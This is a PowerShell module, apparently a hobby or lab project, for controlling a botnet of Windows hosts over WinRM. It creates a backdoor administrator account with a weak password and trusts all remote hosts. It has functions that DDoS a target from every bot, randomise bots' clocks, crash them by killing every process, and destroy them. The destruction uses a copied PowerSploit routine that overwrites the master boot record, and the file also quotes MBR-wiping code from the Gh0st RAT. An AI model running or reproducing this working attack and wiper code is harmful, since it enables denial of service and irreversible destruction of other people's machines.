

function Initialize-Master{
<#

.SYNOPSIS
This is command Initalizes the local host to act as a Master for the botnet

.DESCRIPTION
Performs task thst allow the local host to send commands to bot
    Starts by adding user, used by bots to write to host file
    modifies all networks to be set to private which is required foir remoting
    Creates CSV file "botlist" for storing bots
    Enable the services for remote PowerShell commands
    Allows all hosts to connect and execute commands on the local host
    Restarts WinRM service to apply changes

.EXAMPLE
    Initalize-Master

#>
#adds user for bot connections
try{
     $compName = $env:COMPUTERNAME
     $cn = [ADSI]"WinNT://$compname"
     $user = $cn.Create('User',"botmaster")
     $user.SetPassword("password")
     $user.setinfo()
     $user.Description = " "
     $user.setinfo()
     $group = [ADSI]"WinNT://$env:COMPUTERNAME/Administrators,group"
     $group.Add("WinNT://$env:COMPUTERNAME/botmaster,user")
}catch{} 
    #enables pinging 
   Import-Module NetSecurity
   Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-in)" -Enabled True
   #changes all network connections to private
   Get-NetConnectionProfile | Set-NetConnectionProfile -NetworkCategory Private 
   #opens port 80 for in and out bound connections
   New-NetFirewallRule -DisplayName "Allow inbound TCP Port 443" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow
   New-NetFirewallRule -DisplayName "Allow outbound TCP Port 443" -Direction Outbound -LocalPort 80 -Protocol TCP -Action Allow  
   Enable-PSRemoting -force 
   # create botlist database
   $filename = 'C:\Program Files\botlist.csv'
   if ((Test-Path $filename) -eq $False) {
         Set-Content -Path $filename "IP address, HostName, Failed connects"
    }
    #qucikconfigs Windows remote service
    winrm quickconfig -quiet -force
    #allows remote managment form any host
    Set-Item wsman:\localhost\client\trustedhosts * -force
    #restarts windows remote service
    Restart-Service WinRM -force
}

function Test-Bot{
<#

.SYNOPSIS
Used to check if a Bot host can be reached

.DESCRIPTION
Tests if bot can be reach from host 
if the specified bot can be reached 
    if the bot does not exist in the botlist CSV file, the bot's IP,Hostname,0
    the 0 being the number of times the master has filed to connect
    if the bot exists the entry is updated by reset the failed connection count to 0
If the bot can not be reached
    if the failed connection count retrived from the botlist file is less than 3
    the count value is incremmented and updated in the file
    if the number of failed connection is greater than 3 the bot is removed from the file     

.EXAMPLE
    Test-Bot <BOT IP Address>

#>
    param  
    (  
        [Parameter(Mandatory=$true)]  
        [ValidateScript({$_ -match [IPAddress]$_ })]  
        [String]$ip  
          
    )
    $filename = "C:\Program Files\botlist.csv"
    #creates botlist file if it doesnt exist
    if(![System.IO.File]::Exists($filename)){
        Set-Content -Path $filename "IP address, HostName, Failed connects"
    }
    #checks connectivity of bot
    if(Test-Connection("$ip") -Quiet){
       Write-host "Bot $ip is live"
        if( Select-String -Pattern $ip -Path "$filename"-Quiet){
            #finds existing bot and gets line number
           $contents = Get-Content $filename
           $linestr = select-string -Pattern $ip -Path "$filename" | Select-Object -ExpandProperty Linenumber
           $linenum = [convert]::ToInt32($linestr)
           #get information from database
           $line =  $contents | Select -Index ($linenum-1)
           $ip,$Targetname,$count = $line.split(',',3)
           #reset count to zero and write back to file
           $count = [convert]::ToInt32($count)
           $count = 0;
           
           $contents[$linenum-1] = "$ip,$Targetname,$count"
           $contents | Set-Content "$filename"

        }else{
            #adds new bot
           $Targetname = [System.Net.Dns]::GetHostEntry($ip)  | FL HostName | Out-String | %{ "{0}" -f $_.Split(':')[1].Trim() };
           Add-Content "$filename" "$ip,$Targetname,0"   
        }
        return $true
    }else{
        #get info of bot
     
        if( Select-String -Pattern $ip -Path "$filename"-Quiet){
           $linestr = select-string -Pattern $ip -Path "$filename" | Select-Object -ExpandProperty Linenumber
           $linenum = [convert]::ToInt32($linestr)
           $contents = Get-Content "$filename"
           $line = $contents | Select -Index ($linenum-1)
           $ip,$Targetname,$count = $line.split(',',3)
           
           $count = [convert]::ToInt32($count)
           if($count -ge 4){
            #bot failed connection count is greater than 4 and bot is removed
                Write-Host "Bot $ip has been Dead for too long removing"
                $contents = Get-Content "$filename"
                
                $contents -replace $contents[$linenum -1],"" | Set-Content "$filename"   


           }else{
                # bot failed less than 4, count is incremented
                Write-host "Bot $ip has been dead for $count tries"
                $count++
                $contents = Get-Content "$filename"
                $contents[$linenum -1] = "$ip,$Targetname,$count"
                $contents | Set-Content "$filename"
            }
        }
        return $false
    }
    
}

function Test-AllBots{
<#

.SYNOPSIS
Performs the test-bot command on all bots listed in the botlist.csv file

.DESCRIPTION
Performs the test-bot command on all bots listed in the botlist.csv file
 goes sequentaly through the botlist.csv file and runs the Test-Bot command

.EXAMPLE
Test-AllBots

.NOTES
Doesn't allow for the adding of new bots
mainly used to prune large numbers of bots



#>
$filename = 'C:\Program Files\botlist.csv'
    $lines = Get-Content $filename
    $count = 0
    Get-Content $filename |%{ $count++ }
    #check that there are bots in the database
    if($count -le 1){
        Write-Host "No Bots are present in botlist.csv Exiting ..."
        return
    }
    $livecount = 0
    $downcount = 0
    #runs Test-Bot on all host in file and prints counts
    foreach ($line in $lines[1..($lines.Count -1)]) {
            $botip,$botname,$count = $line.split(',',3)
            $botip = [IPAddress]$botip.Trim()
            write-host "Bot is being tested $botip"
	        
            if(Test-Bot $botip){
                $livecount++
            }else{
                $downcount++
            }

    }
    Write-Host "Number of live hosts $livecount"
    Write-Host "Number of down hosts $downcount"
}


function Test-Target{
<#

.SYNOPSIS
Selects a random bot to ping a specified target

.DESCRIPTION
Randomly selects a bot form the botlist.csv file
Runs test-bot to ensure that the bot is up
then uses the bot to ping a specified IP address

.EXAMPLE
    Test-Target <Target IP Address>

#>
     
    param  
    (  
        [Parameter(Mandatory=$true)]  
        [ValidateScript({$_ -match [IPAddress]$_ })]  
        [String]$targetip  
          
    )
    $filename = 'C:\Program Files\botlist.csv'
    $count = 0
    Get-Content $filename |%{ $count++ }
    if($count -le 1){
        Write-Host "No Bots are present in botlist.csv Exiting ..."
        return
    }
    $line = Get-Random -InputObject (get-content $filename)
    $botip,$botname,$count = $line.split(',',3)
    $botip = [IPAddress]$botip.Trim()
	if(Test-Bot $botip){
        Write-Host " Bot $botip will attempt to ping Target $targetip"
        $pwd = "UserPassw0rd123"
        $spwd = ConvertTo-SecureString -AsPlainText $pwd -Force
        $cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist "Admin",$spwd
        Invoke-Command $botip -ScriptBlock{Test-Connection $targetip -AsJob } -Credential $cred
    }else{
        Write-Host "Bot $botip is down"
    } 
}

function Test-DDOSTarget{
<#

.SYNOPSIS
uses all bots to ping a specified target to attempt a DDoS

.DESCRIPTION
Goes down the botlist.csv file tests tests the bot
then the bot pings the target ip address
the hope is that with enough host a DDoS would occur

.EXAMPLE
    Test-DDOSTarget <Target IP Address>

#>
     
    param  
    (  
        [Parameter(Mandatory=$true)]  
        [ValidateScript({$_ -match [IPAddress]$_ })]  
        [String]$targetip  
          
    )
    $filename = 'C:\Program Files\botlist.csv'
    $lines = Get-Content $filename
    $count = 0
    Get-Content $filename |%{ $count++ }
    if($count -le 1){
        Write-Host "No Bots are present in botlist.csv Exiting ..."
        return
    }
     Write-Host "BotNet will atempt to DDOS Target at $targetip"
    foreach ($line in $lines[1..($lines.Count -1)]) {
        $botip,$botname,$count = $line.split(',',3)
        $botip = [IPAddress]$botip.Trim()
	    
        if(Test-Bot $botip){
            $pwd = "UserPassw0rd123"
            $spwd = ConvertTo-SecureString -AsPlainText $pwd -Force
            $cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist "Admin",$spwd
    	    Invoke-Command $botip -ScriptBlock{Test-Connection $targetip -AsJob -Count 1000000 } -Credential $cred 
        }else{
            Write-Host "Bot $botip is down"
        }
    }

}

function Set-RandomTime{
 <#

.SYNOPSIS
Sets the specified bot's system time to a random time

.DESCRIPTION
Generates a random Date object between 1/1/1900 to 1/1/2100
then tests if the bot is up 
then changes the bots time to match the random Date

.EXAMPLE
   Set-RandomTime <Target IP Address>

#>
    param  
    (  
        [Parameter(Mandatory=$true)]  
        [ValidateScript({$_ -match [IPAddress]$_ })]  
        [String]$ip  
          
    )
    #generation of a random date
    $filename = 'C:\Program Files\botlist.csv'
	[DateTime]$theMin = "1/1/1900"
	[DateTime]$theMax = "1/1/2100"
 	$theRandomGen = new-object random
	$theRandomTicks = [Convert]::ToInt64( ($theMax.ticks * 1.0 - $theMin.Ticks * 1.0 ) * $theRandomGen.NextDouble() + $theMin.Ticks * 1.0 )
	$RandTime = new-object DateTime($theRandomTicks)
    Write-Host "Bot at $ip will be set to $RandTime"
	if(Test-Bot $ip){
        #check if bot is up and change the bbots date
        $pwd = "UserPassw0rd123"
        $spwd = ConvertTo-SecureString -AsPlainText $pwd -Force
        $cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist "Admin",$spwd
        Invoke-Command $ip -ScriptBlock{set-date -date $args[0]} -Credential $cred -ArgumentList $RandTime
    }else{
        Write-Host "Bot $ip is down"
    } 
}

function Set-AllRandomTime{
 <#

.SYNOPSIS
Sets all bots' system time to a random time

.DESCRIPTION
goes through the botlist csv file and passes each bots ip address to Set-Randtime

.EXAMPLE
   Set-AllRandomTime 

#>
   $filename = 'C:\Program Files\botlist.csv'
   $lines = Get-Content $filename
   $count = 0
    Get-Content $filename |%{ $count++ }
    if($count -le 1){
        Write-Host "No Bots are present in botlist.csv Exiting ..."
        return
    }
    foreach ($line in $lines[1..($lines.Count -1)]) {
        $botip,$botname,$count = $line.split(',',3)
        $botip = [IPAddress]$botip.Trim()
        Set-RandomTime $botip
    }
}

function Send-BlueScreen{
 <#

.SYNOPSIS
Causes the specified bot to bluescreen

.DESCRIPTION
Using Get-Proccss then piping to Stop-Proccess -force on the specified bot 
Causes the bot to bluescreen

.EXAMPLE
   Send-BlueScreen <Target IP Address>

#>
    param  
    (  
        [Parameter(Mandatory=$true)]  
        [ValidateScript({$_ -match [IPAddress]$_ })]  
        [String]$ip  
          
    )
    $filename = 'C:\Program Files\botlist.csv'
    if(Test-Bot $ip){ #check host to ensure host is up and on the list and if not keeps the list up to date
        Write-Host "Bot $ip is being BlueScreened"
        $pwd = "UserPassw0rd123"
        $spwd = ConvertTo-SecureString -AsPlainText $pwd -Force
        $cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist "Admin",$spwd
	    invoke-command $ip -ScriptBlock{get-process | stop-process -force} -Credential $cred
    }else{
        Write-Host "Bot $ip is down"
    } 
}
#Send-BlueScreens all hosts
function Send-BlueScreenAll{
 <#

.SYNOPSIS
Causes the all bots to bluescreen

.DESCRIPTION
Parses IP addresses of all bots in the botlist.csv file
one by one these IP addresses are passed to the Send-BlueScreen command

.EXAMPLE
   Send-BlueScreenAll

#>
    $filename = 'C:\Program Files\botlist.csv'
    $lines = Get-Content $filename
    $count = 0
    Get-Content $filename |%{ $count++ }
    if($count -le 1){
        Write-Host "No Bots are present in botlist.csv Exiting ..."
        return
    }
    foreach ($line in $lines[1..($lines.Count -1)]) {
        $botip,$botname,$count = $line.split(',',3)
        $botip = [IPAddress]$botip.Trim()
        Send-BlueScreen $botip
    }

}

function Remove-Bot{
<#

.SYNOPSIS
Overwirtes the specified bot's MFT and remove Bot from database 

.DESCRIPTION
uses a function included as part of the Mayhem Module of Powerspolit
To overwrite the master file table of the specified bot
the bot is then removed from the botlist.csv file

.EXAMPLE
   Remove-BOt <Target IP Address>

#>
 
    param  
    (  
        [Parameter(Mandatory=$true)]  
        [ValidateScript({$_ -match [IPAddress]$_ })]  
        [String]$ip  
          
    )
    $filename = 'C:\Program Files\botlist.csv'
    $lines = Get-Content $filename
    $count = 0
    Get-Content $filename |%{ $count++ }
    if($count -le 1){
        Write-Host "No Bots are present in botlist.csv Exiting ..."
        return
    }
 	if(Test-Bot $ip){
    
        $pwd = "UserPassw0rd123"
        $spwd = ConvertTo-SecureString -AsPlainText $pwd -Force
        $cred = New-Object -typename System.Management.Automation.PSCredential -argumentlist "Admin",$spwd
	    Invoke-command $ip -ScriptBlock{ Set-MasterBootRecord -Force -RebootImmediately } -Credential $cred
        $linestr = select-string -Pattern $ip -Path "$filename" | Select-Object -ExpandProperty Linenumber
        $linenum = [convert]::ToInt32($linestr)
        $contents = Get-Content "$filename"
        $line = $contents | Select -Index ($linenum-1)
        $ip,$Targetname,$count = $line.split(',',3)
        Write-Host "Bot $ip has been destroyed"
        $contents = Get-Content "$filename"
        $contents -replace $contents[$linenum -1],"" | Set-Content "$filename" 
    }else{
        Write-Host "Bot $ip is down"
    } 
}

function Clear-BotNet{
<#

.SYNOPSIS
Overwirtes the all bots MFT and deletes the Bot database 

.DESCRIPTION
uses a function included as part of the Mayhem Module of Powerspolit
To overwrite the master file table of all bots in the botlist.csv file
then the botlist.csv is removed and the Master module is removed

.EXAMPLE
   Clear-BotNet

#>
    $filename = 'C:\Program Files\botlist.csv'
    $lines = Get-Content $filename
    $count = 0
    Get-Content $filename |%{ $count++ }
    if($count -le 1){
        Write-Host "No Bots are present in botlist.csv Exiting ..."
        return
    }
    foreach ($line in $lines[1..($lines.Count -1)]) {
            $botip,$botname,$count = $line.split(',',3)
            $botip = [IPAddress]$botip.Trim()
            Remove-Bot $botip
    }
	Remove-Item -path $filename -Confirm:$false
	Remove-Module -Name master  -Force -Confirm:$false
	

}


#Taken from Powersploit's Mayhem module, a POC that shows that powershell can modify the MFT
function Set-MasterBootRecord{
<#
.SYNOPSIS
    Proof of concept code that overwrites the master boot record with the
    message of your choice.
    PowerSploit Function: Set-MasterBootRecord
    Author: Matthew Graeber (@mattifestation) and Chris Campbell (@obscuresec)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
 
.DESCRIPTION
    Set-MasterBootRecord is proof of concept code designed to show that it is
    possible with PowerShell to overwrite the MBR. This technique was taken
    from a public malware sample. This script is inteded solely as proof of
    concept code.
.PARAMETER BootMessage
    Specifies the message that will be displayed upon making your computer a brick.
.PARAMETER RebootImmediately
    Reboot the machine immediately upon overwriting the MBR.
.PARAMETER Force
    Suppress the warning prompt.
.EXAMPLE
    Set-MasterBootRecord -BootMessage 'This is what happens when you fail to defend your network. #CCDC'
.NOTES
    Obviously, this will only work if you have a master boot record to
    overwrite. This won't work if you have a GPT (GUID partition table)
#>

<#
This code was inspired by the Gh0st RAT source code seen here (acquired from: http://webcache.googleusercontent.com/search?q=cache:60uUuXfQF6oJ:read.pudn.com/downloads116/sourcecode/hack/trojan/494574/gh0st3.6_%25E6%25BA%2590%25E4%25BB%25A3%25E7%25A0%2581/gh0st/gh0st.cpp__.htm+&cd=3&hl=en&ct=clnk&gl=us):
// CGh0stApp message handlers 
 
unsigned char scode[] = 
"\xb8\x12\x00\xcd\x10\xbd\x18\x7c\xb9\x18\x00\xb8\x01\x13\xbb\x0c" 
"\x00\xba\x1d\x0e\xcd\x10\xe2\xfe\x49\x20\x61\x6d\x20\x76\x69\x72" 
"\x75\x73\x21\x20\x46\x75\x63\x6b\x20\x79\x6f\x75\x20\x3a\x2d\x29"; 
 
int CGh0stApp::KillMBR() 
{ 
	HANDLE hDevice; 
	DWORD dwBytesWritten, dwBytesReturned; 
	BYTE pMBR[512] = {0}; 
	 
	// ????MBR 
	memcpy(pMBR, scode, sizeof(scode) - 1); 
	pMBR[510] = 0x55; 
	pMBR[511] = 0xAA; 
	 
	hDevice = CreateFile 
		( 
		"\\\\.\\PHYSICALDRIVE0", 
		GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, 
		NULL, 
		OPEN_EXISTING, 
		0, 
		NULL 
		); 
	if (hDevice == INVALID_HANDLE_VALUE) 
		return -1; 
	DeviceIoControl 
		( 
		hDevice,  
		FSCTL_LOCK_VOLUME,  
		NULL,  
		0,  
		NULL,  
		0,  
		&dwBytesReturned,  
		NULL 
		); 
	// ?????? 
	WriteFile(hDevice, pMBR, sizeof(pMBR), &dwBytesWritten, NULL); 
	DeviceIoControl 
		( 
		hDevice,  
		FSCTL_UNLOCK_VOLUME,  
		NULL,  
		0,  
		NULL,  
		0,  
		&dwBytesReturned,  
		NULL 
		); 
	CloseHandle(hDevice); 
 
	ExitProcess(-1); 
	return 0; 
} 
#>

    [CmdletBinding(SupportsShouldProcess = $True, ConfirmImpact = 'High')] Param (
        [ValidateLength(1, 479)]
        [String]
        $BootMessage = 'Stop-Crying; Get-NewHardDrive',

        [Switch]
        $RebootImmediately,

        [Switch]
        $Force
    )

    if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
    {
        throw 'This script must be executed from an elevated command prompt.'
    }

    if (!$Force)
    {
        if (!$psCmdlet.ShouldContinue('Do you want to continue?','Set-MasterBootRecord prevent your machine from booting.'))
        {
            return
        }
    }

    #region define P/Invoke types dynamically
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32')
    $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32', $False)

    $TypeBuilder = $ModuleBuilder.DefineType('Win32.Kernel32', 'Public, Class')
    $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
    $SetLastError = [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
    $SetLastErrorCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor,
        @('kernel32.dll'),
        [Reflection.FieldInfo[]]@($SetLastError),
        @($True))

    # Define [Win32.Kernel32]::DeviceIoControl
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('DeviceIoControl',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([IntPtr], [UInt32], [IntPtr], [UInt32], [IntPtr], [UInt32], [UInt32].MakeByRefType(), [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::CreateFile
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CreateFile',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [IntPtr],
        [Type[]]@([String], [Int32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::WriteFile
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('WriteFile',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType(), [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Ansi)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    # Define [Win32.Kernel32]::CloseHandle
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CloseHandle',
        'kernel32.dll',
        ([Reflection.MethodAttributes]::Public -bor [Reflection.MethodAttributes]::Static),
        [Reflection.CallingConventions]::Standard,
        [Bool],
        [Type[]]@([IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetCustomAttribute($SetLastErrorCustomAttribute)

    $Kernel32 = $TypeBuilder.CreateType()
    #endregion

    $LengthBytes = [BitConverter]::GetBytes(([Int16] ($BootMessage.Length + 5)))
    # Convert the boot message to a byte array
    $MessageBytes = [Text.Encoding]::ASCII.GetBytes(('PS > ' + $BootMessage))

    [Byte[]] $MBRInfectionCode = @(
        0xb8, 0x12, 0x00,         # MOV  AX, 0x0012 ; CMD: Set video mode, ARG: text resolution 80x30, pixel resolution 640x480, colors 16/256K, VGA
        0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Set video mode
        0xb8, 0x00, 0x0B,         # MOV  AX, 0x0B00 ; CMD: Set background color
        0xbb, 0x01, 0x00,         # MOV  BX, 0x000F ; Background color: Blue
        0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Set background color
        0xbd, 0x20, 0x7c,         # MOV  BP, 0x7C18 ; Offset to string: 0x7C00 (base of MBR code) + 0x20
        0xb9) + $LengthBytes + @( # MOV  CX, 0x0018 ; String length
        0xb8, 0x01, 0x13,         # MOV  AX, 0x1301 ; CMD: Write string, ARG: Assign BL attribute (color) to all characters
        0xbb, 0x0f, 0x00,         # MOV  BX, 0x000F ; Page Num: 0, Color: White
        0xba, 0x00, 0x00,         # MOV  DX, 0x0000 ; Row: 0, Column: 0
        0xcd, 0x10,               # INT  0x10       ; BIOS interrupt call - Write string
        0xe2, 0xfe                # LOOP 0x16       ; Print all characters to the buffer
        ) + $MessageBytes

    $MBRSize = [UInt32] 512

    if ($MBRInfectionCode.Length -gt ($MBRSize - 2))
    {
        throw "The size of the MBR infection code cannot exceed $($MBRSize - 2) bytes."
    }

    # Allocate 512 bytes for the MBR
    $MBRBytes = [Runtime.InteropServices.Marshal]::AllocHGlobal($MBRSize)

    # Zero-initialize the allocated unmanaged memory
    0..511 | % { [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, $_), 0) }

    [Runtime.InteropServices.Marshal]::Copy($MBRInfectionCode, 0, $MBRBytes, $MBRInfectionCode.Length)

    # Write boot record signature to the end of the MBR
    [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, ($MBRSize - 2)), 0x55)
    [Runtime.InteropServices.Marshal]::WriteByte([IntPtr]::Add($MBRBytes, ($MBRSize - 1)), 0xAA)

    # Get the device ID of the boot disk
    $DeviceID = Get-WmiObject -Class Win32_DiskDrive -Filter 'Index = 0' | Select-Object -ExpandProperty DeviceID

    $GENERIC_READWRITE = 0x80000000 -bor 0x40000000
    $FILE_SHARE_READWRITE = 2 -bor 1
    $OPEN_EXISTING = 3

    # Obtain a read handle to the raw disk
    $DriveHandle = $Kernel32::CreateFile($DeviceID, $GENERIC_READWRITE, $FILE_SHARE_READWRITE, 0, $OPEN_EXISTING, 0, 0)

    if ($DriveHandle -eq ([IntPtr] 0xFFFFFFFF))
    {
        throw "Unable to obtain read/write handle to $DeviceID"
    }

    $BytesReturned = [UInt32] 0
    $BytesWritten =  [UInt32] 0
    $FSCTL_LOCK_VOLUME =   0x00090018
    $FSCTL_UNLOCK_VOLUME = 0x0009001C

    $null = $Kernel32::DeviceIoControl($DriveHandle, $FSCTL_LOCK_VOLUME, 0, 0, 0, 0, [Ref] $BytesReturned, 0)
    $null = $Kernel32::WriteFile($DriveHandle, $MBRBytes, $MBRSize, [Ref] $BytesWritten, 0)
    $null = $Kernel32::DeviceIoControl($DriveHandle, $FSCTL_UNLOCK_VOLUME, 0, 0, 0, 0, [Ref] $BytesReturned, 0)
    $null = $Kernel32::CloseHandle($DriveHandle)

    Start-Sleep -Seconds 2

    [Runtime.InteropServices.Marshal]::FreeHGlobal($MBRBytes)

    Write-Verbose 'Master boot record overwritten successfully.'

    if ($RebootImmediately)
    {
        Restart-Computer -Force
    }
}

